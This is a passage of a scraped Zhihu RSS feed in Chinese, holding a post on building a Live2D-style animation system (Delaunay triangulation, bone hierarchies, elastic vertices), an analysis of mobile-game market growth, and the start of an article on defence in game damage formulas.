data-watermark-src=\"v2-5278ed48f83d0835542e7cb3cff17bd2\" data-private-watermark-src=\"v2-a089eefb7e9152162d377203bb383625\"></p>\n<p>2、最大化最小角特性：在散点集可能形成的三角剖分中，Delaunay三角剖分所形成的三角形的最小角最大。从这个意义上讲，Delaunay三角网是“最接近于规则化的“的三角网。具体的说是指在两个相邻的三角形构成凸四边形的对角线，在相互交换后，六个内角的最小角不再增大。如下图所示：</p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-899f882b9c11ed742e8fb2341083b1e0_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"386\" data-rawheight=\"153\" data-watermark=\"watermark\" data-original-src=\"v2-899f882b9c11ed742e8fb2341083b1e0\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>以下是Delaunay剖分所具备的优异特性：</p>\n<p>1.最接近：以最近的三点形成三角形，且各线段(三角形的边)皆不相交。</p>\n<p>2.唯一性：不论从区域何处开始构建，最终都将得到一致的结果。</p>\n<p>3.最优性：任意两个相邻三角形形成的凸四边形的对角线如果可以互换的话，那么两个三角形六个内角中最小的角度不会变大。</p>\n<p>4.最规则：如果将三角网中的每个三角形的最小角进行升序排列，则Delaunay三角网的排列得到的数值最大。</p>\n<p>5.区域性：新增、删除、移动某一个顶点时只会影响临近的三角形。</p>\n<p>6.具有凸四边形的外壳：三角网最外层的边界形成一个凸多边形的外壳。</p>\n<p>在Delaunay三角建立算法中,最著名的有<i><b>Lawson</b>及</i><b><i>Bowyer-Watson</i>算法</b>,但lawson算法不论是速度还是实际应用的实用度都不如后者,因此在Live2D中笔者使用了后者作为三角剖分算法</p>\n<p>其伪代码如下</p>\n<ol>\n<li>构造一个超级三角形，包含所有散点，放入三角形链表。</li>\n<li>将点集中的散点依次插入，在三角形链表中找出外接圆包含插入点的三角形（称为该点的影响三角形），删除影响三角形的公共边，将插入点同影响三角形的全部顶点连接起来，完成一个点在Delaunay三角形链表中的插入。</li>\n<li>根据优化准则对局部新形成的三角形优化。将形成的三角形放入Delaunay三角形链表。</li>\n<li>循环执行上述第2步，直到所有散点插入完毕。</li>\n<li>剔除与超级三角顶点有关的三角形</li>\n</ol>\n<p>但上述的伪代码是存在问题的,这个问题发生在后面加上的第五步,这可能导致剔除后产生一个非完整的凸包</p>\n<p><img src=\"https://pic1.zhimg.com/v2-6e4a8a563428ebbc5318dd72e84d4d70_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"347\" data-rawheight=\"321\" data-watermark=\"watermark\" data-original-src=\"v2-6e4a8a563428ebbc5318dd72e84d4d70\" data-watermark-src=\"v2-a6309069e09830ba78480b0935c1a8a7\" data-private-watermark-src=\"v2-01d8d534883e506bf7a27e9d8f451a69\"></p>\n<p>因此,在第五步剔除三角形之后,应该预先每一个有关顶点,在进行一次判断,以让其满足夹角为锐角的条件,以生成一个完整的凸包</p>\n<p>之后,我们需要依据外围顶点的封闭区域,剔除掉封闭区域之外的三角形,最后建立网格</p>\n<p><img src=\"https://pic1.zhimg.com/v2-42ba0f2fe2fe70adcd03d981d8867818_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"184\" data-rawheight=\"184\" data-watermark=\"watermark\" data-original-src=\"v2-42ba0f2fe2fe70adcd03d981d8867818\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>不管如何,当我们最终完成了三角剖分算法后,我们就可以着手将模型加载进来,正如你所见,每一个实际图层都绑定着一套网格</p>\n<p><img src=\"https://pic4.zhimg.com/v2-d938249e9506272c28bfc60bd46bcc4c_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"384\" data-rawheight=\"418\" data-watermark=\"watermark\" data-original-src=\"v2-d938249e9506272c28bfc60bd46bcc4c\" data-watermark-src=\"v2-f55b91638048ad928757521879e0c6fe\" data-private-watermark-src=\"v2-60b87289bce9b2463c3185c8b4765d9f\"></p>\n<p>实际上整个live2D模型,也正是基于顶点变换的基础之上的</p>\n<p><img src=\"https://pic3.zhimg.com/v2-30323075beac3eedc7355a56c6a43745_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"437\" data-rawheight=\"426\" data-watermark=\"watermark\" data-original-src=\"v2-30323075beac3eedc7355a56c6a43745\" data-watermark-src=\"v2-81b252cd77353235805eb84c9eaf2b88\" data-private-watermark-src=\"v2-13f0de00bf13ddc7abd05958b58b50c4\"></p>\n<p>而基于这点,我们不入Live2D的下一个话题,骨骼动画,如果我们摸摸自己的身体,很容易总结出一个道理,在人体中的大部分骨骼,由一个关节节点连接到另一个关节节点上,而基于这点的拓展,我们同样可以为每一个图层设置一个关键的节点</p>\n<p><img src=\"https://pic1.zhimg.com/v2-5a5245c124c21b48ca2efe01cded3e98_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"384\" data-rawheight=\"397\" data-watermark=\"watermark\" data-original-src=\"v2-5a5245c124c21b48ca2efe01cded3e98\" data-watermark-src=\"v2-89a885e093837d72ec75e896e9c45edf\" data-private-watermark-src=\"v2-5480571dff79360f27c2039114d8d34f\"></p>\n<p>为了简化说明下这个流程,笔者创建了一个三个图层组成的样例,每个图层由一条粗线组成</p>\n<p><img src=\"https://pic4.zhimg.com/v2-f9c13842497a7e78b5705c6f9a245b44_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"466\" data-rawheight=\"417\" data-watermark=\"watermark\" data-original-src=\"v2-f9c13842497a7e78b5705c6f9a245b44\" data-watermark-src=\"v2-5f741dc08aa81f399f5500ff96f247f5\" data-private-watermark-src=\"v2-374b4c95ccc75164824e28b9fba91014\"></p>\n<p>可以看到,每个图层都由一个关键节点进行控制,图层网格中的所有顶点,都围绕着该关键节点进行旋转,平移,伸缩变换,连接这些关键的节点,形成一个正确的骨骼系统</p>\n<p><img src=\"https://pic1.zhimg.com/v2-51e8e41509982e32c63ae146b7b0a6d6_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"373\" data-rawheight=\"328\" data-watermark=\"watermark\" data-original-src=\"v2-51e8e41509982e32c63ae146b7b0a6d6\" data-watermark-src=\"v2-74d486bf69cd0010484302109157ad09\" data-private-watermark-src=\"v2-464a46c99bcd47b7cc555ec15e0738df\"></p>\n<p>在live2D中,骨骼系统满足以下条件</p>\n<p>1.所有的图层都有且只有一个节点</p>\n<p>2.一个节点如果没有父节点,那么这个节点是根节点</p>\n<p>3.一个节点可以有多个子节点,但一个节点最多只能有一个父节点</p>\n<p>4.图层中所有的顶点以节点为参考点进行旋转平移缩放</p>\n<p>5.父节点的任何变换将传递影响影响其所有子节点</p>\n<p>于是,在动画系统中,我们可以通过操作骨骼节点,直接对模型进行动作编辑,它可以等效为一系列矩阵的级联操作-------动画由一系列骨骼节点组成,下一个节点的变换相当于上一个节点的变换加上本节点的变换,相当于一些列矩阵相乘起来,</p>\n<p>简单来说就是</p>\n<p>根节点的变换矩阵---&gt;骨骼节点的变换矩阵---&gt;顶点的变换矩阵--&gt;额外的物理计算矩阵</p>\n<p><img src=\"https://pic4.zhimg.com/v2-68af72b21d87e983b876209953a4e596_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"226\" data-rawheight=\"228\" data-watermark=\"watermark\" data-original-src=\"v2-68af72b21d87e983b876209953a4e596\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>至此,我们依照这个原理将整个模型的骨骼连接起来</p>\n<p><img src=\"https://pic2.zhimg.com/v2-a8b55b3bfd9ac49e359397472678598e_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"314\" data-rawheight=\"396\" data-watermark=\"watermark\" data-original-src=\"v2-a8b55b3bfd9ac49e359397472678598e\" data-watermark-src=\"v2-c107f5f527c28b193b9d2490c146150f\" data-private-watermark-src=\"v2-7e440f55c8bdb2cb4e78297ea03993da\"></p>\n<p>这个时候,这个Live2D动画系统成为了一个正宗的纸娃娃动画系统,通过对骨骼节点的控制,我们就可以实现一个纸娃娃动画了</p>\n<p><img src=\"https://pic3.zhimg.com/v2-fcba8a07169f1faf7ea1b0c0bd166406_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"170\" data-rawheight=\"191\" data-watermark=\"watermark\" data-original-src=\"v2-fcba8a07169f1faf7ea1b0c0bd166406\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><img src=\"https://pic1.zhimg.com/v2-07f5a75ca31e572c9891a8ada8d56573_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"170\" data-rawheight=\"191\" data-watermark=\"watermark\" data-original-src=\"v2-07f5a75ca31e572c9891a8ada8d56573\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-754e6246b7ae3e4a3d6183d502f4af73_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"170\" data-rawheight=\"191\" data-watermark=\"watermark\" data-original-src=\"v2-754e6246b7ae3e4a3d6183d502f4af73\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>当然,当我们实现了一个纸娃娃系统,离live2D已经很接近了,但live2D相较于纸娃娃系统在动画中有更多的细节,你可能已经注意到,在上面的动画中,耳朵与头发有轻微幅度的摆动,这就是live2D中,对于某些顶点在物理上有额外的计算与模拟</p>\n<p>我将它称之为弹性节点,通过对整个模型的平移,你可以很容易观察到弹性节点对于那些柔软的补位是如何进行物理模拟的</p>\n<p><img src=\"https://pic4.zhimg.com/v2-208c8518cda1753447ef7bd45e061c6c_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"274\" data-rawheight=\"227\" data-watermark=\"watermark\" data-original-src=\"v2-208c8518cda1753447ef7bd45e061c6c\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>首先我们知道,每个图层的网格由若干个顶点控制,每个顶点互相连接</p>\n<p><img src=\"https://pic3.zhimg.com/v2-63937c247223e5e21c62b93c02f0db5f_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"276\" data-rawheight=\"388\" data-watermark=\"watermark\" data-original-src=\"v2-63937c247223e5e21c62b93c02f0db5f\" data-watermark-src=\"v2-3fb0645383d9c829b75e074300040152\" data-private-watermark-src=\"v2-5f6c4b4fedacc76fb996263053f438e9\"></p>\n<p>那么我们可以认为,对于那些弹性顶点,和静态顶点直接由一个可以视作一个弹簧连接,这样,我们可以直接给出弹性系数,来指定该顶点在动画中的运动规律,注意的是,这里的弹性系数和弹簧的弹力公式中的系数并不一致,为0表示这是一个静态顶点(刚体)</p>\n<p><img src=\"https://pic2.zhimg.com/v2-ca9ad212d85a03034f06535ad050f6e6_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"599\" data-rawheight=\"376\" data-watermark=\"watermark\" data-original-src=\"v2-ca9ad212d85a03034f06535ad050f6e6\" data-watermark-src=\"v2-5dd98735f4b7f34845955eb0e84bd510\" data-private-watermark-src=\"v2-884642c18bc61f37de3b43fa96e779c5\"></p>\n<p>但多顶点之间级联会导致顶点运算变得非常复杂,因此,我们可以简化上述流程,视作每一个顶点与图层节点相连,距离节点越远,弹性系数越大,同时,运动过程中的阻力衰减也越弱</p>\n<p><img src=\"https://pic2.zhimg.com/v2-21645700bdaf649fcc22fc294aaba036_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"379\" data-rawheight=\"273\" data-watermark=\"watermark\" data-original-src=\"v2-21645700bdaf649fcc22fc294aaba036\" data-watermark-src=\"v2-2c832be1f2b0bcb35add8adf73a66e64\" data-private-watermark-src=\"v2-acd067c3c42afc4b429fc864caafa7fe\"></p>\n<p>那么,剩下我们要做的,就是为这个弹力公式挑选一个合适的数学模型了.关于这部分,你可以在PainterEngine Live的代码中找到,笔者就不再进一步讨论了</p>\n<p>到这里,有了纸娃娃动画,有了弹性节点,我们终于迎来了制作Live2D最后一个功能,我管它叫动作追踪(Action Tracer)</p>\n<p>顾名思义,就是能够依据某个输入,完成某一类追踪类动作,例如,下面是一个非常简单的追踪例子,人物跟随着鼠标的运动进行运动,当然,鼠标的运动可以和机器识别相结合,绑定在摄像头中人人物进行联动</p>\n<p><img src=\"https://pic2.zhimg.com/v2-9f8a063155b37f64e256fe1db300465b_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"322\" data-rawheight=\"388\" data-watermark=\"watermark\" data-original-src=\"v2-9f8a063155b37f64e256fe1db300465b\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>尽管我们的模型仍然是由一系列的二维图片组成,但3D渲染器的投影变换仍然能够给予我们足够的启发来完成这个让2D图像看起来像3D的功能</p>\n<p>例如在上面的例子中,我们可以想象脸部的纹理贴在了一个类似于球面的曲面上,当我们尝试旋转这个球体的时候,当3D顶点坐标投影到2D坐标上时,我们可以近似认为这个坐标在保持u,v纹理坐标不变的情况下,在x,y方向上被压缩了</p>\n<p>例如,下面的动画是以整个模型进行变换的(仅作为示范,其动画并不准确)</p>\n<p><img src=\"https://pic2.zhimg.com/v2-c0907d584e38ebe61bef89523352510d_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"193\" data-rawheight=\"218\" data-watermark=\"watermark\" data-original-src=\"v2-c0907d584e38ebe61bef89523352510d\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>它能够实现小幅度的整体脸部及身体旋转功能,当然,商用的live2D有着更多的计算来完成这种效果,但对于我们这个简单版本的live2D,倒也足够了</p>\n<p>最后说个后记</p>\n<p>制作整个Live2D的核心渲染,骨骼框架和额外的弹性模拟与曲面贴图,其代码并不复杂大约在2-3k行左右,大约2周时间就完成了,但Live2D的配套的Editor占据了剩下5个月的所有时间</p>\n<p>真是配套设施比核芯功能还折腾的多,你可能以为笔者要开始吹一吹在这世间学到了什么,实际上并没有,它涉及的知识,似乎就是你在本科时爱看不看的&lt;&lt;计算机图形学&gt;&gt;里的那堆东东,比起笔者老本行的语音信号处理和nlp里那些折磨人的玩意,实在是友好的多.</p>\n<p>当然,上面的所有代码,都已经开源了,你可以在<a href=\"http://link.zhihu.com/?target=http%3A//PainterEngine.com\" class=\" external\" target=\"_blank\" rel=\"nofollow noreferrer\"><span class=\"invisible\">http://</span><span class=\"visible\">PainterEngine.com</span><span class=\"invisible\"></span></a>中找到editor和PainterEngine Live2D的所有核心和配套源代码</p>\n<p>如果你喜欢这个项目,别忘了给笔者一个star</p>\n<a href=\"http://link.zhihu.com/?target=https%3A//github.com/matrixcascade/PainterEngine\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic2.zhimg.com/v2-f26abff5fc616b03879682ee5c926359_bh.jpg\" data-image-width=\"1200\" data-image-height=\"600\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">matrixcascade/PainterEngine</a><a href=\"http://link.zhihu.com/?target=http%3A//painterengine.com/\" data-draft-node=\"block\" data-draft-type=\"link-card\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">PainterEngine 一个由C语言编写的完整开源的跨平台图形应用框架</a><p>最后,随便做的一个live2D动画做结尾吧</p>\n<p><img src=\"https://pic4.zhimg.com/v2-02a41be961c1dc596b6d30e550106003_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"193\" data-rawheight=\"218\" data-watermark=\"watermark\" data-original-src=\"v2-02a41be961c1dc596b6d30e550106003\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/DBinary?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">DBinary</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/374369010/answer/1954527067?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">6 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/268017572?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">学动画的，想要手绘板？</a><br><a href=\"http://www.zhihu.com/question/398759795?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">我想学2d原画动画，请问我是要去学校还是自学？</a><br>\n","link":"http://www.zhihu.com/question/374369010/answer/1954527067?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"手游市场饱和了吗？以后游戏的增量在哪里？","date":"2021-06-21 15:30:09","description":"\n<p>这个问题非常好，题主老哥有点东西。</p>\n<p>-</p>\n<p>市场有没有饱和？<b>简单的答案是没有</b>——但这个答案是个抖机灵的说法，因为很难说存在一个完全饱和的市场。我们还是拿App Annie的数据做一个比较简单的benchmark。</p>\n<p>首先是收入状态。</p>\n<p>过去12个月YoY对比，可以看到的情况，参照下方的颜色标识，从收入来看，全球范围基本都在增长，但是中国市场的增长率反而是有下降的。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-a69a8eee18c651a97f96f449aa3abde2_720w.jpg?rss\" data-rawwidth=\"2390\" data-rawheight=\"1336\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-a69a8eee18c651a97f96f449aa3abde2\" data-watermark-src=\"v2-747bf4d0fd41ab1247868afa47e7ae33\" data-private-watermark-src=\"v2-0e60dc677b3dfe35e29424f797b16f7a\"></p>\n<p>而下载量的情况来看，中国区的下载量下降是更多的。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-3a2d6013b99f672312a5927b730c5401_720w.jpg?rss\" data-rawwidth=\"2404\" data-rawheight=\"1308\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-3a2d6013b99f672312a5927b730c5401\" data-watermark-src=\"v2-7c2141df4863c70118598011c47ce3c5\" data-private-watermark-src=\"v2-dfb65fda4238b17f5734e300240cf25c\"></p>\n<p>本身，<b>AppAnnie的数据从数值上来说可信度有限</b>，但是从变化和大盘看总体趋势是没有太大问题的。</p>\n<p>虽然说AppAnnie在中国区没有安卓的数据，但近几年从经验来看，AppAnnie上苹果量与实际上的中国区域安卓量基本存在正相关关系。安卓区的下载或者收入，并不会让这个数字变动太多。</p>\n<p>而移动市场的红利其实也在过去几年被释放得比较明显。从下图可见，未来几年的新用户增加不会太多。而纯移动用户转换到游戏付费用户的比例还会更低。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-9a2f358c503805caaac0a7e7b3ca1d1f_720w.jpg?rss\" data-rawwidth=\"1250\" data-rawheight=\"1222\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-9a2f358c503805caaac0a7e7b3ca1d1f\" data-watermark-src=\"v2-3ea7b93b14d2ca635c5ef0afb0434181\" data-private-watermark-src=\"v2-c3113c04343f29c5348c3891e4302447\"></p>\n<p>从这里，我们可以稍微复读两点。</p>\n<ul>\n<li>\n<b>数据显示，中国游戏市场增长有限。</b>如果相信AppAnnie的数据，那么在过去12个月里，同比增长较少；相信伽马的数据，那增长也就在5%左右——对于一个自诩新兴的行业而言，5%的年增长都不算很高。</li>\n<li>网民，即新增用户群的增长在未来看来，也是相对有限的。将增长希望寄托于国内用户的新增，是相对不现实的。</li>\n</ul>\n<p>当然，我们也可以拿新增人口说事儿。毕竟现在小孩子都是digital native。那么我们可以看一下国内的出生人口情况。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-e915b5af876a70e0ec5d74d50b87ae26_720w.jpg?rss\" data-rawwidth=\"1686\" data-rawheight=\"1058\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-e915b5af876a70e0ec5d74d50b87ae26\" data-watermark-src=\"v2-a997475a1fe367942fc47f543cf96e2e\" data-private-watermark-src=\"v2-6fb6e03829119a59c6fc547f31a11012\"></p>\n<p>那么，以有独立付费能力作为起始点，即18岁成年；玩家转化率设定为80%（绝对乐观的比值）的情况下，在未来十多年时间里，每年会有大约12-15m的新玩家增加到市场上——看起来数字不错，但考虑到目前中国广义的移动玩家有6-7亿，那么每年新用户增长只有2.5%甚至更少，这并不是个非常乐观的状态。</p>\n<p>付费的提升有可能吗？在单款游戏上是有可能的。但每个人的付费总预算是有限的，在原神上花的多，在其他游戏上花的相对就会减少。自然有土豪，但行业不能指望土豪。因此ARPU我认为有增长，但是增长速度不会太乐观。</p>\n<p>-</p>\n<p>仅从中国市场的情况来看，基本上我们现在就可以给出一个结论，<b>中国本土游戏市场的增长几乎到顶，未来来看增长潜力已经不多。</b>但如果我们对中国游戏行业有足够多的观察，很容易看到很多相反的现象：游戏投资火热，新项目层出不穷，从业人员工资水涨船高，等等。</p>\n<p>这个现象有两个原因，第一个原因，我将其称为因为高质量游戏产品带来的消费力的释放。</p>\n<p>简而言之，单个高变现效率产品，如《原神》等，增加了更广泛玩家的付费上限：游戏本身在移动游戏同侪中较高的质量，让他们能够以比竞争对手更便宜的价格获取更多的玩家；“二次元群体”（这个词的说法可以再做商榷）本身社群的同温层效应，则造成了更高的充值激励。此外，移动支付的愈发成熟，抽卡模式的高单价和低出货率，客观上的赌博性质也让游戏的付费获得了较高的提升。</p>\n<p>第二个原因则是因为一级市场的反应后置和投资者的kpi压力。游戏投资的火热背后，是大量行业投资的低迷。游戏行业因为存在符合原因一里的多款明星产品，所以以风险投资的性质来看，愿意往这个行业冒险。</p>\n<p>-</p>\n<p><b>VR是增长点吗？</b>很难说。因为VR设备每年全球增量还是极其有限。VR的软件相对而言体验普通，且消费模式还是传统的Premium收费。这样的模式可以养活不少开发商，但能够变现的想象力不多。</p>\n<p><b>而对我来说，Metaverse是骗子概念。</b></p>\n<p>-</p>\n<p>唱衰半天，我觉得游戏行业并非没有增长点。</p>\n<p><b>增长点在哪？</b>以我的个人判断，出海仍然是非常重要的增长点。还是以上面几个图来看，无论是新兴市场的东南亚，拉美，中东，还是传统来看已经饱和的欧美市场，其实都还是有很高的增长率。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-a1f2e22d6f8079ca104b725ae7b37e62_720w.jpg?rss\" data-rawwidth=\"1732\" data-rawheight=\"702\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-a1f2e22d6f8079ca104b725ae7b37e62\" data-watermark-src=\"v2-f102b46582fb14716aa8efe00c5563ea\" data-private-watermark-src=\"v2-2e53090feba5bb62aad877a2c1d35289\"></p>\n<p>上图是我年初拉的AppAnnie数据，基本上中国大陆以外的收入/下载增长都有可观的市场。而国内厂商真正在海外占据上风的品类只有SLG。其他品类偶有成功的作品，但没有完全占据优势的品类。</p>\n<p>具体而言，欧洲和拉美是非常值得注意的市场，放几页ppt（我自己做的），都是公开数据。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-be7e84a017a7715f42366daaa4fdc18d_720w.jpg?rss\" data-rawwidth=\"1808\" data-rawheight=\"972\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-be7e84a017a7715f42366daaa4fdc18d\" data-watermark-src=\"v2-4ed0005064bb73c9e3e6177c5e0745df\" data-private-watermark-src=\"v2-dea737fb40db42e678c849f490cd8f78\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-64b3e3845c4a76feb773b5c5e87b41f3_720w.jpg?rss\" data-rawwidth=\"1868\" data-rawheight=\"944\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-64b3e3845c4a76feb773b5c5e87b41f3\" data-watermark-src=\"v2-a797cf074a148b24e59d08a0b05b76f2\" data-private-watermark-src=\"v2-e0bae8f47e0f38c4f6f8a8a40eef7635\"></p>\n<p><img src=\"https://pic1.zhimg.com/v2-65f0da69fa5e51c26d9c576b7ae962d0_720w.jpg?rss\" data-rawwidth=\"1834\" data-rawheight=\"972\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-65f0da69fa5e51c26d9c576b7ae962d0\" data-watermark-src=\"v2-ca9e876370532ab81286544b126fd542\" data-private-watermark-src=\"v2-f6f60f9a0eb7e40dca409b06bd8d010a\"></p>\n<p>-</p>\n<p>当然，出海好不好做又是另外一个故事了。这个回答里恕不覆盖这部分。</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/question/465199201/answer/1947786674?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\">知乎用户（登录查看详情）</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/465199201/answer/1947786674?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">11 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/332102031?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">为什么国内游戏行业觉得给适合他们的市场，适合他们的政策，甚至适合他们的玩家之后，他们就能做出一流游戏？</a><br><a href=\"http://www.zhihu.com/question/47963469?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">手游的市场到底有多大啊？</a><br>\n","link":"http://www.zhihu.com/question/465199201/answer/1947786674?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"【深入理解魂系列】为什么计算伤害时要考虑防御力？","date":"2021-06-21 03:00:10","description":"\n<p>伤害是很多游戏中绕不过去的一环，毕竟只有对敌人造成伤害，才能最终击杀敌人，赢得胜利。那伤害是如何计算的呢？伤害和攻击力是一回事吗？一般来讲，攻击力是指玩家所具有的一个属性或者一次攻击所具有的属性，而伤害则是这次攻击实际所能造成的血量削减，这两者之间，还差了一个<b>防御力</b>。</p>\n<p>没错，防御力，这就是关键。<b>假设</b>我们的攻击力是100，敌人的防御力是20，伤害公式是普通的减法，那么伤害就是100-20=80。正是防御力让攻击力和伤害有所区别，这就是本文的核心：防御力到底是用来干什么的，为什么需要有防御力？</p>\n<p>防御力以及类似的概念广泛存在于不同的游戏中，但是往往有不同的称呼：防御力，减伤率，抗性……为了统一，以及为了避免与某个具体游戏中的相关概念混淆，接下来我会用一个很别扭的词来表达广义的防御力概念，\"<b>抵抗能力</b>\"。这只是随便给的一个词而已，别扭是因为不别扭的词都被各种游戏用过了，不用太纠结。</p>\n<p>接下来，就让我们一同探索抵抗能力的本质吧。</p>\n<hr>\n<h2>穿上你的护甲</h2>\n<h3>抵抗能力的出现是合乎逻辑的</h3>\n<p>在很多ARPG游戏中，主角是可以拥有护甲的，效果是让主角更耐揍。那么，\"更耐揍\"这一点应该如何体现出来呢？也许可以是增加血量上限，但是由此一来，恢复生命值的药剂应该如何处理，是否应该增加恢复量？当主角卸下护甲之后，生命值又应该如何处理呢？</p>\n<p>这些问题属实不好处理，所以我们干脆把攻击力和伤害分开，在两者中间插入一个抵抗能力，来体现护甲的作用。</p>\n<p>这样看来，抵抗能力的出现是合情合理的，这是体现护甲作用的符合直觉的方式。</p>\n<h3>但是这不一定是抵抗能力在现代游戏中的意义</h3>\n<p>这是抵抗能力的起源，但不一定是它现在的意义。</p>\n<p>如今的游戏中，伤害公式多种多样，如果只是为了体现护甲的作用，真的有必要搞出这么多不同的东西吗？可见，抵抗能力在现代的游戏中，还有更多的作用。</p>\n<p>别着急，我们接着往下说。</p>\n<hr>\n<h2>抵抗能力的本质</h2>\n<h3>本质是约束攻击力成长的收益</h3>\n<p>抵抗能力的本质，就是在约束攻击力成长的收益。</p>\n<p>攻击力本身的提升十分复杂，可以是人物属性、装备、buff等各种来源，难以进行平衡。但是，玩家提升攻击力的最终目标是造成伤害。那么制作组就可以走一个捷径，不用费尽心力调整攻击力的提升，而是直接利用插在攻击力和伤害之间的这个抵抗能力，来约束攻击力成长的收益。</p>\n<p>而不同的伤害公式，其实就体现出不同游戏对于攻击力成长收益的不同约束目标。</p>\n<h3>不同游戏有不同的选择</h3>\n<p>接下来，我们就看一下不同游戏中的一些典型伤害公式，体会它们是如何与游戏的定位相符合的。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-fdbb29992cc689abb4fa283bba688cb1_b.jpg\" data-size=\"normal\" data-rawwidth=\"640\" data-rawheight=\"480\" class=\"origin_image zh-lightbox-thumb\" width=\"640\" data-original=\"https://pic2.zhimg.com/v2-fdbb29992cc689abb4fa283bba688cb1_r.jpg\"><figcaption>盐和避难所 (示意图，仅表示趋势)</figcaption></figure><p>最简单的例子，盐和避难所，完全的线性。具体而言，敌人具有减伤率，直接用攻击力乘(1-减伤率)就可以得到伤害。为什么盐要使用纯线性的伤害公式呢？因为制作组只有两个人，费力去调整伤害公式的平衡，找到一个合适的约束，实在太麻烦，那不如干脆不设约束。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-dcefd9c1249995f21091d2926a8659e1_b.jpg\" data-size=\"normal\" data-rawwidth=\"640\" data-rawheight=\"480\" class=\"origin_image zh-lightbox-thumb\" width=\"640\" 